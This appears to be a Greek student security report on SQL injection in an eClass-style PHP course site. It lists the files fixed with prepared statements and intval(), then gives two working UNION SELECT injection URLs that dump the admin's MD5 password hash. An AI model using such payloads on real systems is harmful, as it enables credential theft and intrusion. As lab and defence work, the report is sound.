# SQL Injections 

Τα sql injections μπορούν να χρησιμοποιηθοούν για να έχουμε πρόσβαση σε __δεδομένα που αποθηκεύονται στην βάση δεδομένων__, όπως ο κωδικός ενός χρήστη(κρυπτογραφημένος σε md5), καθώς και τα ονόματα secret directories που θα μας είναι χρήσιμα για RFI attacks. Δεν βρέθηκαν πολλά σημεία για SQL Injections στο site. Οι προγραμματισμές που το δημιούργησαν χρησιμοποίησαν τεχνικές έτσι ώστε να αποφήγουν είσοδο από τον χρήστη στα SQL Queries, ενώ σε σημεία που δεν μπορεί να αποφευχθεί υπάρχουν συναρτήσεις που καθορίζουν την μορφή των μεταβλητών πριν περάσουν απο τα queries. Ο κύριος τρόπος αντιμετώπισης των injections που παρατηρήσαμε ήταν οριμσένες συναρτήσεις escape, αλλά και χρήση της `intval()` όπου η είσοδος ήταν ακέραιος. Τα προβλήματα παρατηρήθηκαν σε σημεία που η SQL δέχεται είσοδο προσβάσιμη από τον χρήστη μέσω μεταβλητών που ορίζονται στα link.

## Defence

Για την ασφάλεια του site επιλέχθηκε η τεχνική των prepared statements σε queries που η είσοδος μπόρει να καθοριστεί από κάποιον κακόβουλο χρήστη και δεν αφαιρέθηκαν. Τα αρχεία στα οποία βρίσκονται αυτά τα queries είναι:
 - modules/auth/opencourses.php
 - modules/auth/newuser.php
 - modules/auth/listfaculte.php
 - modules/work/work.php

Ενώ στο αρχείο modules/phpbb/viewtopic.php ασφαλίστηκε με την χρήση της συνάρτησης `intval()`.

## Attack

Τα αξιοσημείωτα sql injections που βρέθηκαν έχουν σαν στόχο την εμφάνιση του κρυπτογραφημένου κωδικού του admin. Για να εκτελεστούν αρκούν τα παρακάτω, πρέπει εκ των πρωτέρων να είμαστα σε κάποιο μάθημα, και έπειτα να πάμε σε αυτά τα links:

 - modules/phpbb/viewtopic.php?topic=1 AND 0=1) UNION (SELECT 1,password FROM eclass.user WHERE username = "drunkadmin") -- &forum=1
 - modules/work/work.php?id=%27%20AND%200=1%20UNION%20SELECT%20password%20from%20eclass.user%20where%20username=%22drunkadmin%22%20--%20--

 Στην 1η περίπτωση, ο κωδικός εμφανίζεται σαν όνομα topic, ενώ στην 2η, η σελίδα εμφανίζει μήνυμα οτι η εργασία με τον κωδικό του διαχειριστή δεν υπάρχει.

 